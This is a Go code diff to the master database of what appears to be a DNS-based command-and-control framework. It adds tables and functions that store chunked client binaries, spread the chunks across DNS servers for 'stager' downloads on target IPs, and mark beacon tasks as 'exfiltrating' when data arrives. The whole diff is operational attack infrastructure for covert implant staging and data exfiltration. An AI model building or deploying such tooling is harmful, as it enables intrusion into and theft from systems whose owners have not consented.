@@ -73,6 +73,7 @@ func (d *MasterDatabase) initSchema() error {
 		"PRAGMA synchronous = NORMAL",
 		"PRAGMA cache_size = -64000",
 		"PRAGMA auto_vacuum = INCREMENTAL",
+		"PRAGMA busy_timeout = 5000", // 5 second timeout for busy database
 	}
 
 	for _, pragma := range pragmas {
@@ -200,6 +201,7 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 	CREATE INDEX IF NOT EXISTS idx_tasks_created_at ON tasks(created_at);
 	CREATE INDEX IF NOT EXISTS idx_tasks_assigned_dns ON tasks(assigned_dns_server);
 	CREATE INDEX IF NOT EXISTS idx_tasks_created_by ON tasks(created_by);
+	CREATE INDEX IF NOT EXISTS idx_tasks_status_created ON tasks(status, created_at DESC);
 
 	-- Task results table (aggregated from DNS servers)
 	CREATE TABLE IF NOT EXISTS task_results (
@@ -276,6 +278,68 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 	CREATE INDEX IF NOT EXISTS idx_audit_log_action ON audit_log(action);
 	CREATE INDEX IF NOT EXISTS idx_audit_log_timestamp ON audit_log(timestamp);
 	CREATE INDEX IF NOT EXISTS idx_audit_log_target ON audit_log(target_type, target_id);
+
+	-- Client binaries table (pre-built and chunked binaries for stagers)
+	CREATE TABLE IF NOT EXISTS client_binaries (
+		id TEXT PRIMARY KEY,
+		filename TEXT NOT NULL,
+		os TEXT NOT NULL,
+		arch TEXT NOT NULL,
+		version TEXT,
+		original_size INTEGER NOT NULL,
+		compressed_size INTEGER NOT NULL,
+		base64_size INTEGER NOT NULL,
+		chunk_size INTEGER NOT NULL DEFAULT 403,
+		total_chunks INTEGER NOT NULL,
+		base64_data TEXT NOT NULL,
+		dns_domains TEXT NOT NULL,
+		created_at INTEGER NOT NULL,
+		created_by TEXT,
+		FOREIGN KEY (created_by) REFERENCES operators(id) ON DELETE SET NULL
+	);
+
+	CREATE INDEX IF NOT EXISTS idx_client_binaries_os_arch ON client_binaries(os, arch);
+	CREATE INDEX IF NOT EXISTS idx_client_binaries_created_at ON client_binaries(created_at);
+
+	-- Stager sessions table (track stager deployments across DNS servers)
+	CREATE TABLE IF NOT EXISTS stager_sessions (
+		id TEXT PRIMARY KEY,
+		stager_ip TEXT NOT NULL,
+		os TEXT NOT NULL,
+		arch TEXT NOT NULL,
+		client_binary_id TEXT NOT NULL,
+		total_chunks INTEGER NOT NULL,
+		chunks_delivered INTEGER DEFAULT 0,
+		initiated_by_dns TEXT,
+		created_at INTEGER NOT NULL,
+		last_activity INTEGER NOT NULL,
+		completed INTEGER DEFAULT 0,
+		completed_at INTEGER,
+		FOREIGN KEY (client_binary_id) REFERENCES client_binaries(id) ON DELETE CASCADE,
+		FOREIGN KEY (initiated_by_dns) REFERENCES dns_servers(id) ON DELETE SET NULL
+	);
+
+	CREATE INDEX IF NOT EXISTS idx_stager_sessions_stager_ip ON stager_sessions(stager_ip);
+	CREATE INDEX IF NOT EXISTS idx_stager_sessions_client_binary ON stager_sessions(client_binary_id);
+	CREATE INDEX IF NOT EXISTS idx_stager_sessions_created_at ON stager_sessions(created_at);
+	CREATE INDEX IF NOT EXISTS idx_stager_sessions_completed ON stager_sessions(completed);
+
+	-- Stager chunk assignments table (which DNS server serves which chunk)
+	CREATE TABLE IF NOT EXISTS stager_chunk_assignments (
+		session_id TEXT NOT NULL,
+		chunk_index INTEGER NOT NULL,
+		dns_server_id TEXT NOT NULL,
+		chunk_data TEXT NOT NULL,
+		delivered INTEGER DEFAULT 0,
+		delivered_at INTEGER,
+		PRIMARY KEY (session_id, chunk_index),
+		FOREIGN KEY (session_id) REFERENCES stager_sessions(id) ON DELETE CASCADE,
+		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE
+	);
+
+	CREATE INDEX IF NOT EXISTS idx_stager_chunks_session ON stager_chunk_assignments(session_id);
+	CREATE INDEX IF NOT EXISTS idx_stager_chunks_dns_server ON stager_chunk_assignments(dns_server_id);
+	CREATE INDEX IF NOT EXISTS idx_stager_chunks_delivered ON stager_chunk_assignments(delivered);
 
 	-- Sessions table (JWT session tracking)
 	CREATE TABLE IF NOT EXISTS sessions (
@@ -584,6 +648,18 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		return err
 	}
 
+	// Update task status to "exfiltrating" when first chunk arrives (unless it's already completed)
+	if chunkIndex > 0 || (chunkIndex == 0 && totalChunks == 1) {
+		var currentStatus string
+		err := d.db.QueryRow("SELECT status FROM tasks WHERE id = ?", taskID).Scan(&currentStatus)
+		if err == nil && currentStatus == "sent" {
+			_, err = d.db.Exec("UPDATE tasks SET status = ? WHERE id = ?", "exfiltrating", taskID)
+			if err == nil {
+				fmt.Printf("[Master DB] Task %s status: sent → exfiltrating (first chunk received)\n", taskID)
+			}
+		}
+	}
+
 	// If this was a complete single-chunk result, mark task as completed
 	if isComplete == 1 && totalChunks == 1 {
 		d.markTaskCompleted(taskID)
@@ -762,6 +838,370 @@ func (d *MasterDatabase) GetTaskResultProgress(taskID string) (int, int, error) 
 	}
 
 	return receivedChunks, totalChunks, err
+}
+
+// Client Binary operations
+
+// SaveClientBinary stores a pre-built client binary with chunks for stager deployment
+func (d *MasterDatabase) SaveClientBinary(id, filename, os, arch, version, base64Data, dnsDomains string,
+	originalSize, compressedSize, base64Size, chunkSize, totalChunks int, createdBy string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+
+	_, err := d.db.Exec(`
+		INSERT INTO client_binaries (id, filename, os, arch, version, original_size, compressed_size, 
+			base64_size, chunk_size, total_chunks, base64_data, dns_domains, created_at, created_by)
+		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+	`, id, filename, os, arch, version, originalSize, compressedSize, base64Size, chunkSize,
+		totalChunks, base64Data, dnsDomains, now, createdBy)
+
+	return err
+}
+
+// GetClientBinaries retrieves all stored client binaries
+func (d *MasterDatabase) GetClientBinaries() ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	rows, err := d.db.Query(`
+		SELECT id, filename, os, arch, version, original_size, compressed_size, 
+			base64_size, chunk_size, total_chunks, dns_domains, created_at, created_by
+		FROM client_binaries
+		ORDER BY created_at DESC
+	`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var binaries []map[string]interface{}
+	for rows.Next() {
+		var id, filename, os, arch, version, dnsDomains, createdBy string
+		var originalSize, compressedSize, base64Size, chunkSize, totalChunks int
+		var createdAt int64
+
+		err := rows.Scan(&id, &filename, &os, &arch, &version, &originalSize, &compressedSize,
+			&base64Size, &chunkSize, &totalChunks, &dnsDomains, &createdAt, &createdBy)
+		if err != nil {
+			continue
+		}
+
+		binaries = append(binaries, map[string]interface{}{
+			"id":              id,
+			"filename":        filename,
+			"os":              os,
+			"arch":            arch,
+			"version":         version,
+			"original_size":   originalSize,
+			"compressed_size": compressedSize,
+			"base64_size":     base64Size,
+			"chunk_size":      chunkSize,
+			"total_chunks":    totalChunks,
+			"dns_domains":     dnsDomains,
+			"created_at":      createdAt,
+			"created_by":      createdBy,
+		})
+	}
+
+	return binaries, rows.Err()
+}
+
+// GetClientBinary retrieves a specific client binary by ID
+func (d *MasterDatabase) GetClientBinary(id string) (map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var filename, os, arch, version, base64Data, dnsDomains, createdBy string
+	var originalSize, compressedSize, base64Size, chunkSize, totalChunks int
+	var createdAt int64
+
+	err := d.db.QueryRow(`
+		SELECT id, filename, os, arch, version, original_size, compressed_size, 
+			base64_size, chunk_size, total_chunks, base64_data, dns_domains, created_at, created_by
+		FROM client_binaries
+		WHERE id = ?
+	`, id).Scan(&id, &filename, &os, &arch, &version, &originalSize, &compressedSize,
+		&base64Size, &chunkSize, &totalChunks, &base64Data, &dnsDomains, &createdAt, &createdBy)
+
+	if err != nil {
+		return nil, err
+	}
+
+	return map[string]interface{}{
+		"id":              id,
+		"filename":        filename,
+		"os":              os,
+		"arch":            arch,
+		"version":         version,
+		"original_size":   originalSize,
+		"compressed_size": compressedSize,
+		"base64_size":     base64Size,
+		"chunk_size":      chunkSize,
+		"total_chunks":    totalChunks,
+		"base64_data":     base64Data,
+		"dns_domains":     dnsDomains,
+		"created_at":      createdAt,
+		"created_by":      createdBy,
+	}, nil
+}
+
+// DeleteClientBinary removes a client binary
+func (d *MasterDatabase) DeleteClientBinary(id string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	_, err := d.db.Exec("DELETE FROM client_binaries WHERE id = ?", id)
+	return err
+}
+
+// Stager Session operations
+
+// CreateStagerSession creates a new stager deployment session
+func (d *MasterDatabase) CreateStagerSession(id, stagerIP, os, arch, clientBinaryID, initiatedByDNS string, totalChunks int) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+
+	_, err := d.db.Exec(`
+		INSERT INTO stager_sessions (id, stager_ip, os, arch, client_binary_id, total_chunks, 
+			initiated_by_dns, created_at, last_activity)
+		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+	`, id, stagerIP, os, arch, clientBinaryID, totalChunks, initiatedByDNS, now, now)
+
+	return err
+}
+
+// GetStagerSession retrieves a stager session by ID
+func (d *MasterDatabase) GetStagerSession(sessionID string) (map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var id, stagerIP, os, arch, clientBinaryID, initiatedByDNS string
+	var totalChunks, chunksDelivered, completed int
+	var createdAt, lastActivity, completedAt int64
+
+	err := d.db.QueryRow(`
+		SELECT id, stager_ip, os, arch, client_binary_id, total_chunks, chunks_delivered, 
+			initiated_by_dns, created_at, last_activity, completed, completed_at
+		FROM stager_sessions
+		WHERE id = ?
+	`, sessionID).Scan(&id, &stagerIP, &os, &arch, &clientBinaryID, &totalChunks, &chunksDelivered,
+		&initiatedByDNS, &createdAt, &lastActivity, &completed, &completedAt)
+
+	if err != nil {
+		return nil, err
+	}
+
+	return map[string]interface{}{
+		"id":               id,
+		"stager_ip":        stagerIP,
+		"os":               os,
+		"arch":             arch,
+		"client_binary_id": clientBinaryID,
+		"total_chunks":     totalChunks,
+		"chunks_delivered": chunksDelivered,
+		"initiated_by_dns": initiatedByDNS,
+		"created_at":       createdAt,
+		"last_activity":    lastActivity,
+		"completed":        completed,
+		"completed_at":     completedAt,
+	}, nil
+}
+
+// UpdateStagerSessionActivity updates the last activity timestamp
+func (d *MasterDatabase) UpdateStagerSessionActivity(sessionID string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+	_, err := d.db.Exec("UPDATE stager_sessions SET last_activity = ? WHERE id = ?", now, sessionID)
+	return err
+}
+
+// CompleteStagerSession marks a stager session as completed
+func (d *MasterDatabase) CompleteStagerSession(sessionID string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+	_, err := d.db.Exec(`
+		UPDATE stager_sessions 
+		SET completed = 1, completed_at = ?, chunks_delivered = total_chunks 
+		WHERE id = ?
+	`, now, sessionID)
+	return err
+}
+
+// AssignStagerChunks distributes chunks across DNS servers and stores assignments
+func (d *MasterDatabase) AssignStagerChunks(sessionID, clientBinaryID string, chunks []string, dnsServers []string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	if len(dnsServers) == 0 {
+		return fmt.Errorf("no DNS servers available")
+	}
+
+	// Round-robin distribution of chunks across DNS servers
+	for i, chunkData := range chunks {
+		dnsServerID := dnsServers[i%len(dnsServers)]
+
+		_, err := d.db.Exec(`
+			INSERT INTO stager_chunk_assignments (session_id, chunk_index, dns_server_id, chunk_data)
+			VALUES (?, ?, ?, ?)
+		`, sessionID, i, dnsServerID, chunkData)
+
+		if err != nil {
+			return fmt.Errorf("failed to assign chunk %d: %w", i, err)
+		}
+	}
+
+	return nil
+}
+
+// GetStagerChunk retrieves a specific chunk for a stager session
+func (d *MasterDatabase) GetStagerChunk(sessionID string, chunkIndex int) (string, string, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var chunkData, dnsServerID string
+	err := d.db.QueryRow(`
+		SELECT chunk_data, dns_server_id 
+		FROM stager_chunk_assignments 
+		WHERE session_id = ? AND chunk_index = ?
+	`, sessionID, chunkIndex).Scan(&chunkData, &dnsServerID)
+
+	if err != nil {
+		return "", "", err
+	}
+
+	return chunkData, dnsServerID, nil
+}
+
+// MarkStagerChunkDelivered marks a chunk as delivered
+func (d *MasterDatabase) MarkStagerChunkDelivered(sessionID string, chunkIndex int) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+
+	// Mark chunk as delivered
+	_, err := d.db.Exec(`
+		UPDATE stager_chunk_assignments 
+		SET delivered = 1, delivered_at = ? 
+		WHERE session_id = ? AND chunk_index = ?
+	`, now, sessionID, chunkIndex)
+
+	if err != nil {
+		return err
+	}
+
+	// Update session chunks_delivered count
+	_, err = d.db.Exec(`
+		UPDATE stager_sessions 
+		SET chunks_delivered = chunks_delivered + 1, last_activity = ?
+		WHERE id = ?
+	`, now, sessionID)
+
+	return err
+}
+
+// GetStagerChunksForDNSServer retrieves all chunks assigned to a specific DNS server for a session
+func (d *MasterDatabase) GetStagerChunksForDNSServer(sessionID, dnsServerID string) ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	rows, err := d.db.Query(`
+		SELECT chunk_index, chunk_data, delivered, delivered_at
+		FROM stager_chunk_assignments
+		WHERE session_id = ? AND dns_server_id = ?
+		ORDER BY chunk_index
+	`, sessionID, dnsServerID)
+
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var chunks []map[string]interface{}
+	for rows.Next() {
+		var chunkIndex, delivered int
+		var chunkData string
+		var deliveredAt int64
+
+		if err := rows.Scan(&chunkIndex, &chunkData, &delivered, &deliveredAt); err != nil {
+			continue
+		}
+
+		chunks = append(chunks, map[string]interface{}{
+			"chunk_index":  chunkIndex,
+			"chunk_data":   chunkData,
+			"delivered":    delivered,
+			"delivered_at": deliveredAt,
+		})
+	}
+
+	return chunks, rows.Err()
+}
+
+// GetStagerSessions retrieves all stager sessions
+func (d *MasterDatabase) GetStagerSessions(limit int) ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	query := `
+		SELECT s.id, s.stager_ip, s.os, s.arch, s.total_chunks, s.chunks_delivered,
+			s.initiated_by_dns, s.created_at, s.last_activity, s.completed, s.completed_at,
+			c.filename, c.version
+		FROM stager_sessions s
+		LEFT JOIN client_binaries c ON s.client_binary_id = c.id
+		ORDER BY s.created_at DESC
+	`
+
+	if limit > 0 {
+		query += fmt.Sprintf(" LIMIT %d", limit)
+	}
+
+	rows, err := d.db.Query(query)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var sessions []map[string]interface{}
+	for rows.Next() {
+		var id, stagerIP, os, arch, initiatedByDNS, filename, version string
+		var totalChunks, chunksDelivered, completed int
+		var createdAt, lastActivity, completedAt int64
+
+		err := rows.Scan(&id, &stagerIP, &os, &arch, &totalChunks, &chunksDelivered,
+			&initiatedByDNS, &createdAt, &lastActivity, &completed, &completedAt,
+			&filename, &version)
+
+		if err != nil {
+			continue
+		}
+
+		sessions = append(sessions, map[string]interface{}{
+			"id":               id,
+			"stager_ip":        stagerIP,
+			"os":               os,
+			"arch":             arch,
+			"total_chunks":     totalChunks,
+			"chunks_delivered": chunksDelivered,
+			"initiated_by_dns": initiatedByDNS,
+			"created_at":       createdAt,
+			"last_activity":    lastActivity,
+			"completed":        completed,
+			"completed_at":     completedAt,
+			"client_filename":  filename,
+			"client_version":   version,
+		})
+	}
+
+	return sessions, rows.Err()
 }
 
 // Operator operations
